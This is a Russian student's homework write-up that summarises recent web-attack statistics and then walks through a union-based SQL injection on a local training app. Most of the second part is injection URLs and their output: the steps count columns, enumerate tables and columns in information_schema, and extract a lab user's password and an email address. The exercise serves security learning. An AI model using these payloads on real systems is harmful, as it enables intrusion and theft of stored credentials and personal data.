# 1 Задание

По данным исследования компании Versaca (https://vercara.digicert.com/resources/vercara-waf-analysis-report-november-2025) за ноябрь 2025 года из 1.28 триллиона обработанных веб запросов системой UltraWAF (фаервол), вредоносными из них были 464 миллиарда, что составляет четверть от всех запросов. 
Большая часть из этих запросов была связана с куки-файлами (около 55 %).
Больше всего атакам подвергались сайты для путешествий (81%), сайты связанные с финансами(16%), технологические и связанные с безопасностью (1%)

Пути атак
1. Cookie-based атаки (54.84%)
2. Command Injection (21.00%) (команды для ОС)
3. Field Format violations (10.12%)

---

Исследование центра Solar 4rays (https://www.comnews.ru/content/243602/2026-02-03/2026-w06/1008/veb-prilozheniya-stali-bolee-uyazvimymi) (февраль 2026)

В РФ 2025 сильный рост количества уязвимостей в веб-приложениях (3.2 раза). Большиноство из них связано с использованием стороннего ПО, сайтов написанных с помощью WordPress (как и говорилось на лекции) и сервисов написанных с ИИ.

---

По исследованию COCognito от сентября 2025 (https://www.scworld.com/news/more-than-half-of-internet-exposed-assets-have-no-web-application-firewall) проблема инфобеза приложений не только в наличии вышеперечисленных уязвимостей, но и в отсутсвии защиты. Исследование говорит, что более 50% облачных активов не имеет фаерволов, из них 40% собиррают персональные данные. У необлачных сервисов 67% не имеют фаервол, практически все их них используют персональные данные. 

# 2 Задание

Не вижу поля ввода куда айдишник вводить (хз так и должно быть или не хд попробуем через линк)

Попробовал ввести http://localhost:8080/task/1
Not Found

The requested URL /task/1 was not found on this server.

Странички нема такой попробуем как sql запрос сделать 

http://localhost:8080/task/?id=1

![alt text](image.png)

победа значит тут у нас возможно будет уязвимость скл инъекции (удивительно)

Попробуем 

localhost:8080/task/?id=1'

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

В этом поле и правда просто передается часть скл запроса, + в конце у нас есть id = '1' limit 0, 1

я понял что запрос выглядит как то так 
id='поле из линка' limit 0,1 , можно встаить самому ' дописать свой запрос и все что после просто закоментить, попробуем 

http://localhost:8080/task/?id=1%27+and+1=1+--+

Работает, значит теперь вместо and 1=1 мы можем дописать свою инъекцию 

Для union нам нужно знать сколько колонок в таблице, с помощью order by можем определить 

http://localhost:8080/task/?id=1%27+order+by+1+--+

http://localhost:8080/task/?id=1%27+order+by+4+--+ - получили ошибку Unknown column '4' in 'order clause', значит колонок в таблице у нас 3 (видимо айди, имя и пароль)

Надо понять какое имя у таблицы, для этого хорошо бы было знать какая субд используется (не зная про докер :D )

Можем проверить командой версии 

http://localhost:8080/task/?id=1%27+union+select+version()+--+

The used SELECT statements have a different number of columns

колонок же 3 возвращается

http://localhost:8080/task/?id=-1%27+union+select+1,+2,+@@version+--+
Ваш id:1
Ваш логин:2

Подменяем айди на несуществующий, и теперь видим первые 2 резульата второго селекта, поменяем версию и 2 местами 

http://localhost:8080/task/?id=-1%27+union+select+1,+version()+,+2--+

Ваш id:1
Ваш логин:5.7.44

Значит либо постгря либо mysql, у постгри длинный ответ на это сообщение, а у mysql короткий, значит субд - mysql

тепреь узнаем имя нашей бд (для mysql - select database() )

http://localhost:8080/task/?id=-1%27+union+select+1,+database()+,+2--+

Ваш id:1
Ваш логин:security

имя бд есть, знаем количество колонок, и какие нам будут видны, остается узнать какие таблицы у нас есть в этой бд 

http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_name=%27security%27+--+

просто белый экран (я забыл что там еще табилцу надо найти и хотел сразу колонки смотреть в табилце security)



http://localhost:8080/task/?id=-1%27+union+select+1,+table_name+,3+from+information_schema.tables+where+table_schema=%27security%27+--+

Ваш id:1
Ваш логин:emails

есть таблица с почтами
нужно еще другие, поиграемся с лимитами 

http://localhost:8080/task/?id=-1%27+union+select+1,+table_name+,3+from+information_schema.tables+where+table_schema=%27security%27+limit+0,1+--+

Ваш id:1
Ваш логин:emails

http://localhost:8080/task/?id=-1%27+union+select+1,+table_name+,3+from+information_schema.tables+where+table_schema=%27security%27+limit+1,1+--+

Ваш id:1
Ваш логин:users

http://localhost:8080/task/?id=-1%27+union+select+1,+table_name+,3+from+information_schema.tables+where+table_schema=%27security%27+limit+2,1+--+

белый экран, значит у нас две таблички, почты и юзеры, узнаем какие поля у таблицы юзеров



http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27users%27++--+


Ваш id:1
Ваш логин:id

http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27users%27+limit+1,1++--+


Ваш id:1
Ваш логин:username

http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27users%27+limit+2,1++--+

Ваш id:1
Ваш логин:password

Теперь мы знаем имя бд, таблицы и все нужные нам поля. Просим табилцу users отнимать от 1000 по 7 и делаем финальный удар

http://localhost:8080/task/?id=-1%27+union+select+username,+password,3+from+users+where+username=%27Volk2%27+--+

Ваш id:Volk2
Ваш логин:Wa spoiuuuuu

->??? 1000-7 absolute 


посмотрим в таблицу с почтами

http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27emails%27+limit+0,1++--+

Ваш id:1
Ваш логин:id

http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27emails%27+limit+1,1++--+

Ваш id:1
Ваш логин:email_id

http://localhost:8080/task/?id=-1%27+union+select+1,+column_name+,3+from+information_schema.columns+where+table_schema=%27security%27+and+table_name=%27emails%27+limit+2,1++--+

белый экран

надо узнать айди человечка с именем Vinni-pukh и далее пробить его в таблице с почтами 

http://localhost:8080/task/?id=-1%27+union+select+username,+id,3+from+users+where+username=%27Vinni-pukh%27+--+

Ваш id:Vinni-pukh
Ваш логин:4

http://localhost:8080/task/?id=-1%27+union+select+id,+email_id,3+from+emails+where+id=%274%27+--+

Ваш id:4
Ваш логин:honey_lover@otus-lab.com


# RESULT
Volk2
Wa spoiuuuuu


Vinni-pukh
honey_lover@otus-lab.com





